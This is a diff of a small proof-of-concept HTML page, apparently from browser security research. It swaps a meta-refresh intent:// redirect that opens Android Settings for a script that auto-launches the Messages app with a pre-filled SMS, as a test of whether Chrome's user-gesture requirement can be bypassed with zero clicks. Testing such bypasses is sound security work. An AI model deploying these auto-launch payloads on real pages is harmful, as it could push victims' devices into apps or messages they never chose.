@@ -1,13 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Settings Auto Launch PoC</title>
-  <!-- Zero-click launch using intent -->
-  <meta http-equiv="refresh"
-        content="0;url=intent://#Intent;action=android.settings.SETTINGS;end">
+  <title>Messages Auto Launch Test</title>
 </head>
 <body>
-  <h1>Settings Auto Launch PoC</h1>
-  <p>If the Settings app opens automatically without interaction, Chrome user-gesture enforcement is bypassed.</p>
+  <h1>Messages Auto Launch Test</h1>
+  <p>If the Messages app opens automatically with a pre-filled message, zero-click user-gesture bypass is confirmed.</p>
+
+  <script>
+    // Auto-launch Messages with pre-filled SMS body
+    window.location.href = "sms:15551234567?body=Security%20Alert";
+    
+    // Optional: delayed launch for testing
+    // setTimeout(() => {
+    //     window.location.href = "sms:15551234567?body=Delayed%20Test";
+    // }, 1000);
+  </script>
 </body>
 </html>
